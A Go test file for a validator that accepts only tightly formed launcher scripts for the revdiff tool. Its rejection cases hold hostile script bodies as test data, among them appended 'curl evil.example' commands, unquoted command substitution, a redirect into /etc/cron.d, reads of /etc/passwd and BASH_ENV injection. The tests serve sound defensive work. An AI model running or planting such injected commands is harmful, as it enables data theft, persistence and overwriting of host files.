package cmdpattern

import (
	"path/filepath"
	"strings"
	"testing"
)

const testBin = "/usr/local/bin/revdiff"

// revdiffScriptPattern mirrors what the revdiff tool declares in production.
func revdiffScriptPattern() ScriptPattern {
	return ScriptPattern{
		Shebangs:  []string{"#!/bin/sh"},
		Statement: CommandPattern{Program: "revdiff", ResolvedBin: testBin, ArgsMatcher: MatchAny()},
		Bounds:    LaunchBounds{SharedTmp: testSentinelRoot},
	}
}

// tail reproduces the launcher's write_rc_cmd output for a sentinel path:
//
//	printf '%s; rc=$?; printf "%%s" "$rc" > %s.tmp && mv -f %s.tmp %s'
func tail(sentinel string) string {
	q := "'" + sentinel + "'"
	return "; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q
}

func TestScriptPatternAcceptsLauncherBodies(t *testing.T) {
	p := revdiffScriptPattern()
	const sentinel = "/tmp/revdiff-done-xyz"

	tests := []struct {
		name string
		head string
	}{
		{
			name: "minimal form",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/revdiff-output-abc'",
		},
		{
			name: "with --config",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--config=/home/u/.revdiff.yml' '--output=/tmp/o'",
		},
		{
			name: "with extra positional args",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o' 'main' 'HEAD'",
		},
		{
			name: "with /usr/bin/env prefix",
			head: "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o'",
		},
		{
			name: "no env assignment at all",
			head: "'" + testBin + "' '--output=/tmp/o'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := "#!/bin/sh\n" + tt.head + tail(sentinel) + "\n"
			if !p.MatchesBody([]byte(body)) {
				t.Errorf("MatchesBody rejected a real launcher body:\n%s", body)
			}
		})
	}
}

// TestScriptPatternAcceptsHostResolvedEditor is the counterweight to the
// rejected editor values below: an absolute EDITOR naming the file the host's
// own PATH lookup yields is the case the env prefix exists for. The host's own
// setting stands in for an installed editor - none is present on every machine.
func TestScriptPatternAcceptsHostResolvedEditor(t *testing.T) {
	bin, err := ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}
	t.Setenv("EDITOR", bin)
	p := revdiffScriptPattern()

	for _, assign := range []string{"EDITOR=" + bin, "EDITOR=nvim", "EDITOR="} {
		head := "/usr/bin/env '" + assign + "' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" +
			testBin + "' '--output=/tmp/o'"
		body := "#!/bin/sh\n" + head + tail("/tmp/s") + "\n"
		if !p.MatchesBody([]byte(body)) {
			t.Errorf("MatchesBody rejected a legitimate launcher body:\n%s", body)
		}
	}
}

func TestScriptPatternRejects(t *testing.T) {
	p := revdiffScriptPattern()
	const sentinel = "/tmp/revdiff-done-xyz"
	okHead := "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o'"

	tests := []struct {
		name string
		body string
	}{
		{
			name: "empty body",
			body: "",
		},
		{
			name: "missing shebang is fine but missing tail is not",
			body: okHead + "\n",
		},
		{
			name: "disallowed shebang",
			body: "#!/bin/bash\n" + okHead + tail(sentinel) + "\n",
		},
		{
			name: "second statement appended after the sentinel clause",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "; curl evil.example\n",
		},
		{
			name: "second statement on its own line",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\ncurl evil.example\n",
		},
		{
			name: "unquoted command substitution in an argument",
			body: "#!/bin/sh\n" + "'" + testBin + "' --output=$(curl evil)" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted backtick substitution in an argument",
			body: "#!/bin/sh\n" + "'" + testBin + "' --output=`curl evil`" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted redirect appended to the head",
			body: "#!/bin/sh\n" + "'" + testBin + "' '--output=/tmp/o' > /etc/cron.d/x" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted program",
			body: "#!/bin/sh\n" + "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true " + testBin + " '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "program is not revdiff",
			body: "#!/bin/sh\n'/bin/cat' '/etc/passwd'" + tail(sentinel) + "\n",
		},
		{
			name: "revdiff by basename from another directory",
			body: "#!/bin/sh\n'/tmp/revdiff' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "bare env instead of absolute /usr/bin/env",
			body: "#!/bin/sh\nenv 'EDITOR=nvim' '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "env planted in the shared temp directory",
			body: "#!/bin/sh\n" + filepath.Dir(sharedTmpEditor) + "/env 'EDITOR=nvim' '" +
				testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "editor pointing into the shared temp directory",
			body: "#!/bin/sh\n/usr/bin/env 'EDITOR=" + sharedTmpEditor + "' '" +
				testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "editor as an unquoted bare assignment",
			body: "#!/bin/sh\nEDITOR=nvim '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			// Without the `env` prefix nothing parses this as an assignment:
			// POSIX recognizes one only while the name and `=` are unquoted, so
			// the shell runs the token as the command word. `env` is what makes
			// the quoted form an assignment, and it is absent here.
			name: "quoted editor assignment with no env prefix",
			body: "#!/bin/sh\n'EDITOR=nvim' '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			// The same token with a `/` in it: the shell skips the PATH lookup
			// and execs it as a pathname relative to the launcher's cwd, which
			// is the project tree bind-mounted read-write.
			name: "quoted editor assignment naming a path with no env prefix",
			body: "#!/bin/sh\n'EDITOR=/usr/bin/nano' '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			// A quoted inert assignment is the same non-assignment; the value
			// side being harmless does not make the token stop being argv[0].
			name: "quoted inert assignment with no env prefix",
			body: "#!/bin/sh\n'REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true' '" +
				testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			// U+00A0 is not IFS whitespace, so the shell reads this line as a
			// command word and looks it up on PATH. Trimming it as "blank"
			// would hide a second statement from the one-statement check while
			// leaving its bytes in the body the host runs.
			name: "second line of non-IFS unicode whitespace",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\n \n",
		},
		{
			name: "second line of vertical tab",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\n\v\n",
		},
		{
			name: "unallowlisted variable as an unquoted bare assignment",
			body: "#!/bin/sh\nBASH_ENV=/tmp/x.sh '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "unallowlisted variable in the env prefix",
			body: "#!/bin/sh\n/usr/bin/env 'PYTHONSTARTUP=/tmp/x.py' '" +
				testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "inert flag repurposed to carry a path",
			body: "#!/bin/sh\nREVDIFF_EXIT_CODE_ON_ANNOTATIONS=/tmp/evil '" +
				testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "mismatched sentinel paths across the clause",
			body: "#!/bin/sh\n" + okHead +
				"; rc=$?; printf \"%s\" \"$rc\" > '/tmp/a'.tmp && mv -f '/tmp/b'.tmp '/tmp/a'\n",
		},
		{
			name: "relative sentinel path",
			body: "#!/bin/sh\n" + okHead + tail("tmp/relative") + "\n",
		},
		{
			name: "non-canonical sentinel path",
			body: "#!/bin/sh\n" + okHead + tail("/tmp/../etc/passwd") + "\n",
		},
		{
			name: "pipeline instead of the sentinel clause",
			body: "#!/bin/sh\n" + okHead + " | curl evil.example\n",
		},
		{
			name: "heredoc",
			body: "#!/bin/sh\ncat <<EOF\nevil\nEOF\n",
		},
		{
			name: "carriage returns",
			body: "#!/bin/sh\r\n" + okHead + tail(sentinel) + "\r\n",
		},
		{
			name: "null byte",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\x00",
		},
		{
			name: "quoted token concatenated with a bare suffix",
			body: "#!/bin/sh\n'" + testBin + "'evil '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if p.MatchesBody([]byte(tt.body)) {
				t.Errorf("MatchesBody accepted a body it must reject:\n%q", tt.body)
			}
		})
	}
}

// TestScriptPatternAcceptsSubstitutionInsideSingleQuotes documents a
// deliberate allowance. `$(...)` and backticks are shell-significant only when
// unquoted or double-quoted; inside single quotes POSIX sh passes them through
// literally (verified against sh: `printf '%s' '$(echo X)'` prints `$(echo X)`).
// The bytes therefore reach revdiff as an ordinary argument and never reach a
// shell that would act on them, so rejecting them would add no safety while
// breaking legitimate paths and branch names. The unquoted forms above are
// rejected, which is where the real risk lives.
func TestScriptPatternAcceptsSubstitutionInsideSingleQuotes(t *testing.T) {
	p := revdiffScriptPattern()

	for _, arg := range []string{"--output=$(curl evil)", "--output=`curl evil`", "--output=/tmp/a;b"} {
		body := "#!/bin/sh\n'" + testBin + "' '" + arg + "'" + tail("/tmp/s") + "\n"
		if !p.MatchesBody([]byte(body)) {
			t.Errorf("MatchesBody rejected a safely single-quoted argument %q", arg)
		}
	}
}

func TestScriptPatternRejectsOversizedBody(t *testing.T) {
	p := revdiffScriptPattern()
	p.MaxBytes = 128

	body := "#!/bin/sh\n'" + testBin + "' '--output=" + strings.Repeat("a", 200) + "'" + tail("/tmp/s") + "\n"
	if p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody accepted a body exceeding MaxBytes, want rejected")
	}
}

// TestScriptPatternRejectsSmuggledTail guards the head/tail split. Splitting on
// the first "; rc=" means an argument containing that text truncates the head
// mid-quote, which must fail closed rather than let the real tail through.
func TestScriptPatternRejectsSmuggledTail(t *testing.T) {
	p := revdiffScriptPattern()
	sentinel := "/tmp/revdiff-done-xyz"

	body := "#!/bin/sh\n'" + testBin + "' '--output=/tmp/o; rc=1' 'x'" + tail(sentinel) + "\n"
	if p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody accepted a body with a smuggled '; rc=' inside an argument, want rejected")
	}
}

func TestScriptPatternNoShebangAllowed(t *testing.T) {
	p := revdiffScriptPattern()
	body := "'" + testBin + "' '--output=/tmp/o'" + tail("/tmp/s") + "\n"
	if !p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody rejected a shebang-less body whose single statement is valid, want accepted")
	}
}

// TestScriptPatternConfinesSentinel covers the herdr side of the same bound.
// The tail here writes and renames rather than touching, so an unbounded path
// was an arbitrary host-file overwrite, not just an empty-file create.
func TestScriptPatternConfinesSentinel(t *testing.T) {
	head := "'" + testBin + "' '--output=/tmp/o'"

	tests := []struct {
		name     string
		root     string
		sentinel string
		want     bool
	}{
		{"inside the root", testSentinelRoot, testSentinelRoot + "/revdiff-done-1", true},
		{"host rc file", testSentinelRoot, "/home/u/.bashrc", false},
		{"sibling of the root", testSentinelRoot, testSentinelRoot + "foo/done", false},
		{"empty root denies", "", testSentinelRoot + "/revdiff-done-1", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := revdiffScriptPattern()
			p.Bounds.SharedTmp = tt.root
			body := "#!/bin/sh\n" + head + tail(tt.sentinel) + "\n"
			if got := p.MatchesBody([]byte(body)); got != tt.want {
				t.Errorf("MatchesBody(sentinel=%q) = %v, want %v", tt.sentinel, got, tt.want)
			}
		})
	}
}
